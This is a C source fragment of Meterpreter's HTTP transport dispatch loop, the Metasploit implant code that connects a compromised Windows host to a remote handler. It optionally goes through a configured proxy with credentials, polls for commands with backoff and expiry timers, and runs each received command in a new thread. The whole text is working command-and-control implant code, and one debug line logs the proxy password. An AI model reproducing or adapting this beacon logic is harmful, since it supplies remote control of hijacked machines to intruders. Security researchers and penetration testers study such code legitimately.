/*
 * The servers main dispatch loop for incoming requests using SSL over TCP
 */
static DWORD server_dispatch_http_wininet( Remote * remote )
{
	LONG result     = ERROR_SUCCESS;
	Packet * packet = NULL;
	THREAD * cpt    = NULL;
	URL_COMPONENTS bits;
	DWORD ecount = 0;
	DWORD delay = 0;
	char tmpHostName[512];
	char tmpUrlPath[1024];

	if (global_expiration_timeout > 0) 
		remote->expiration_time  = current_unix_timestamp() + global_expiration_timeout;
	else
		remote->expiration_time = 0;
	
	remote->comm_timeout     = global_comm_timeout;
	remote->start_time       = current_unix_timestamp();
	remote->comm_last_packet = current_unix_timestamp();
	
	// Allocate the top-level handle
	if (!strcmp(global_meterpreter_proxy,"METERPRETER_PROXY")) {
		remote->hInternet = InternetOpen(global_meterpreter_ua, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	}
	else {
		remote->hInternet = InternetOpen(global_meterpreter_ua, INTERNET_OPEN_TYPE_PROXY, global_meterpreter_proxy, NULL, 0);
	}	if (!remote->hInternet) {
		dprintf("[DISPATCH] Failed InternetOpen: %d", GetLastError());
		return 0;
	}
	dprintf("[DISPATCH] Configured hInternet: 0x%.8x", remote->hInternet);

	
	// The InternetCrackUrl method was poorly designed...
	memset(tmpHostName, 0, sizeof(tmpHostName));
	memset(tmpUrlPath, 0, sizeof(tmpUrlPath));

	memset(&bits, 0, sizeof(bits));
	bits.dwStructSize = sizeof(bits);
	bits.dwHostNameLength  = sizeof(tmpHostName) -1;
	bits.lpszHostName      = tmpHostName;
	bits.dwUrlPathLength   = sizeof(tmpUrlPath) -1;
	bits.lpszUrlPath       = tmpUrlPath;

	InternetCrackUrl(remote->url, 0, 0, &bits);

	remote->uri = _strdup(tmpUrlPath);

	dprintf("[DISPATCH] Configured URL: %s", remote->uri);
	dprintf("[DISPATCH] Host: %s Port: %u", tmpHostName, bits.nPort);

	// Allocate the connection handle
	remote->hConnection = InternetConnect(remote->hInternet, tmpHostName, bits.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!remote->hConnection) {
		dprintf("[DISPATCH] Failed InternetConnect: %d", GetLastError());
		return 0;
	}
	dprintf("[DISPATCH] Configured hConnection: 0x%.8x", remote->hConnection);

	//authentication
	if (!(strcmp(global_meterpreter_proxy_username, "METERPRETER_USERNAME_PROXY") == 0))
	{
		InternetSetOption(remote->hConnection, INTERNET_OPTION_PROXY_USERNAME, global_meterpreter_proxy_username, (DWORD)strlen(global_meterpreter_proxy_username)+1);
		InternetSetOption(remote->hConnection, INTERNET_OPTION_PROXY_PASSWORD, global_meterpreter_proxy_password, (DWORD)strlen(global_meterpreter_proxy_password)+1);
		dprintf("[DISPATCH] Proxy authentication configured : %s/%s", global_meterpreter_proxy_username, global_meterpreter_proxy_password);
	}

	// Bring up the scheduler subsystem.
	result = scheduler_initialize( remote );
	if( result != ERROR_SUCCESS )
		return result;

	while( TRUE )
	{
		if (remote->comm_timeout != 0 && remote->comm_last_packet + remote->comm_timeout < current_unix_timestamp()) {
			dprintf("[DISPATCH] Shutting down server due to communication timeout");
			break;
		}

		if (remote->expiration_time != 0 && remote->expiration_time < current_unix_timestamp()) {
			dprintf("[DISPATCH] Shutting down server due to hardcoded expiration time");
			dprintf("Timestamp: %u  Expiration: %u", current_unix_timestamp(), remote->expiration_time);
			break;
		}

		if( event_poll( serverThread->sigterm, 0 ) )
		{
			dprintf( "[DISPATCH] server dispatch thread signaled to terminate..." );
			break;
		}

		dprintf("[DISPATCH] Reading data from the remote side...");
		result = packet_receive( remote, &packet );
		if( result != ERROR_SUCCESS ) {

			// Update the timestamp for empty replies
			if (result == ERROR_EMPTY) 
				remote->comm_last_packet = current_unix_timestamp();

			if (ecount < 10)
				delay = 10 * ecount;
			else 
				delay = 100 * ecount;
			
			ecount++;

			dprintf("[DISPATCH] no pending packets, sleeping for %dms...", min(10000, delay));
			Sleep( min(10000, delay) );
			continue;
		}

		remote->comm_last_packet = current_unix_timestamp();

		// Reset the empty count when we receive a packet
		ecount = 0;

		dprintf("[DISPATCH] Returned result: %d", result);

		cpt = thread_create( command_process_thread, remote, packet );
		if( cpt )
		{
			dprintf( "[DISPATCH] created command_process_thread 0x%08X, handle=0x%08X", cpt, cpt->handle );
			thread_run( cpt );
		}	
	}

	// Close WinInet handles
	InternetCloseHandle(remote->hConnection);
	InternetCloseHandle(remote->hInternet);

	dprintf( "[DISPATCH] calling scheduler_destroy..." );
	scheduler_destroy();

	dprintf( "[DISPATCH] calling command_join_threads..." );
	command_join_threads();

	dprintf( "[DISPATCH] leaving server_dispatch." );

	return result;
}